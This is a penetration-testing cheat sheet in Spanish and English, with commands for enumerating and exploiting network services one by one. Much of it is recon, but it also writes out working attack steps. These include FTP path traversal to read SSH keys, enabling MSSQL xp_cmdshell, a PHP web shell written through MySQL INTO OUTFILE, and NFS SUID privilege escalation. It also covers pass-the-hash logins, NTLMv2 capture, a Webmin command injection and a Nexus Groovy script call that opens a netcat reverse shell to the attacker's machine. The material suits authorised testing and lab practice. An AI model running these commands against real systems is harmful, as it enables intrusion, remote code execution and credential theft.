---
title: Enumeración por servicio (recon ABC)
slug: service-enumeration
category: tools
updated: 2026-06-30
summary: "Command-by-command recon per port/service + internal apps"
tags: [recon, enumeration, smb, ldap, http, ftp, kerberos, nfs]
sensitive: false
---

# Enumeración por servicio (recon ABC)

## When to use
Tras el scan de puertos: para cada servicio abierto ejecutar TODOS los pasos de su sección. Enumerar SIEMPRE servicios internos en localhost (`ss -tlnp` en host comprometido) — los más jugosos no están expuestos.

## Scan inicial
```bash
nmap -sV -sC -p- --min-rate 3000 -T4 TARGET -oN full_scan.txt
nmap -sU --top-ports 100 TARGET -oN udp_scan.txt
```

## FTP (21) / TFTP (69/udp)
```bash
ftp TARGET   # anonymous/anonymous o vacío ; prompt off; mget *
nxc ftp TARGET -u anonymous -p ""
wget -m --no-passive ftp://anonymous:anonymous@TARGET
# Path traversal en FTP internos (uftpd): leer SSH key sin credenciales
ftp TARGET 2121  → get ../../../home/srvadm/.ssh/id_rsa /tmp/k
curl -s "ftp://TARGET:2121/../../../etc/passwd"
# TFTP (UDP, fácil de pasar por alto) — configs Cisco Type 7
nmap -sU -p69 TARGET; curl -s -o cfg "tftp://TARGET/running-config"
```

## SSH (22)
```bash
ssh -i id_rsa USER@TARGET   # chmod 600 id_rsa primero
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null USER@TARGET
ssh -D 127.0.0.1:1080 USER@TARGET -N -f   # SOCKS5
ssh -L LPORT:127.0.0.1:RPORT USER@TARGET  # local forward
```

## DNS (53) — intentar zone transfer SIEMPRE
```bash
dig axfr @TARGET DOMAIN.local     # prueba CON y SIN prefijo (ad.x da NXDOMAIN, x sí transfiere)
dig -x IP @TARGET
ffuf -w subdomains.txt -u http://TARGET -H "Host: FUZZ.DOMAIN.com" -fc 404,302
```

## HTTP/HTTPS (80/443)
```bash
whatweb http://TARGET; curl -I http://TARGET; nmap -sV -sC -p 80,443 TARGET
feroxbuster -u http://TARGET -w raft-medium-directories.txt -x php,txt,html,bak,old,zip -t 40
ffuf -w subdomains.txt -u http://TARGET -H "Host: FUZZ.DOMAIN.com" -fc 404,302,301  # VHosts: obligatorio aunque AXFR dé hosts
curl http://TARGET/{robots.txt,.git/config,.env,phpinfo.php,wp-json/wp/v2/users}
# LFI/RFI/SQLi
curl "http://TARGET/p.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"
sqlmap -u "http://TARGET/p.php?id=1" --dbs --batch
# Upload bypass: .phtml.png (Apache procesa .phtml como PHP), .php5, .phar, GIF89a+php
```

## RPC (111/135)
```bash
rpcinfo -p TARGET; showmount -e TARGET           # 111 Linux
rpcclient -U "" -N TARGET   → enumdomusers; enumdomgroups; netshareenum   # 135
```

## SMB (445)
```bash
nxc smb TARGET -u "" -p "" --shares ; nxc smb TARGET -u guest -p "" --shares
smbclient //TARGET/SHARE -N
nxc smb TARGET -u U -p P --shares --rid-brute --users --pass-pol
nxc smb TARGET -u U -p P -M spider_plus
nmap -p 445 --script smb-vuln-ms17-010 TARGET
sudo responder -I eth0 -dwv   # capturar NTLMv2 (.lnk UNC en share escribible)
# Descarga estable de archivos grandes (smbclient get se cuelga / NT_STATUS_IO_TIMEOUT):
mount -t cifs '//TARGET/Share' /mnt/smb -o username=U,password=P,domain=D
```

## MSSQL (1433)
```bash
impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth
# SQL: SELECT IS_SRVROLEMEMBER('sysadmin'); SELECT name,password_hash FROM sys.sql_logins;
EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_dirtree '\\KALI\share';   # capturar NTLMv2 con Responder
```

## MySQL (3306)
```bash
mysql -u root -pPASS -h TARGET    # defaults root:root/toor/''
# SELECT LOAD_FILE('/etc/passwd'); SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php';
```

## NFS (2049) — pillaging remoto como root
```bash
showmount -e TARGET; sudo mount -t nfs TARGET:/share /mnt/nfs
grep -rniE 'pass|secret' /mnt/nfs       # siempre
# no_root_squash → cp /bin/bash /mnt/nfs/bash; chmod +s; en target: /path/bash -p
```

## LDAP (389/636)
```bash
ldapsearch -H ldap://TARGET -x -b "DC=DOMAIN,DC=local"
nxc ldap TARGET -u U -p P --users --asreproast asrep.txt --kerberoasting kerb.txt
# Campos que esconden passwords (vivos Y eliminados):
ldapsearch -x -H ldap://DC_IP -D 'user@DOMAIN' -w PASS -b 'DC=DOMAIN,DC=local' \
  '(objectClass=user)' sAMAccountName description info comment
# Deleted Objects (tombstones) — control -E, bind UPN, sin proxychains
ldapsearch -x -H ldap://DC_IP -D 'user@DOMAIN' -w PASS \
  -b 'CN=Deleted Objects,DC=ad,DC=DOMAIN,DC=local' \
  -E '!1.2.840.113556.1.4.417=:' '(objectClass=user)' sAMAccountName description
bloodhound-python -u U -p P -d DOMAIN -ns DC_IP -c All --zip
```

## Kerberos (88) / RDP (3389) / WinRM (5985)
```bash
kerbrute userenum --dc DC_IP -d DOMAIN users.txt -o valid.txt
xfreerdp /v:TARGET /u:USER /p:PASS /dynamic-resolution     # RDP (si WinRM falla, prueba RDP: grupos distintos)
xfreerdp /v:TARGET /u:Admin /pth:HASH /restricted-admin /cert-ignore
evil-winrm -i TARGET -u USER -H HASH   # requiere grupo Remote Management Users
```

## Apps internas (corren como cuenta de servicio → shell = esa cuenta)
```bash
# Jenkins 8080 /script (Groovy): "whoami".execute().text
# Liferay 8080 Script Console Groovy = RCE ; creds en portal-ext.properties (NFS)
# Nexus 8081 Groovy Script API:
curl -u admin:PASS -H "Content-Type: application/json" -X POST \
  http://T:8081/service/rest/v1/script -d '{"name":"rce","type":"groovy","content":"[\"cmd\",\"/c\",\"nc.exe KALI 9003 -e cmd.exe\"].execute()"}'
curl -u admin:PASS -X POST http://T:8081/service/rest/v1/script/rce/run -H "Content-Type: text/plain"
# Webmin 10000 CVE-2019-15107 (1.890): POST /password_change.cgi old=test|COMMAND
```

## Gotchas
- AXFR: probar dominio con Y sin prefijo (`ad.x` puede dar NXDOMAIN, `x` transfiere).
- VHost fuzzing obligatorio aunque AXFR ya dé hosts (reveló 6 subdominios extra).
- `smbclient get` se cuelga con archivos grandes → `mount -t cifs` + `cp`.
- Acceso a subcarpetas SMB depende de grupos; WinRM depende de Remote Management Users.
- Identifica bajo qué cuenta corre cada app (`ps aux`, `tasklist /svc`).

## References
- Relacionado: [[netexec-crackmapexec]], [[web-app-attacks]], [[reverse-shells]], [[active-directory-attacks]], [[password-spray]], [[pena-toolbox]]
- 03_ABC_SERVICIOS.md
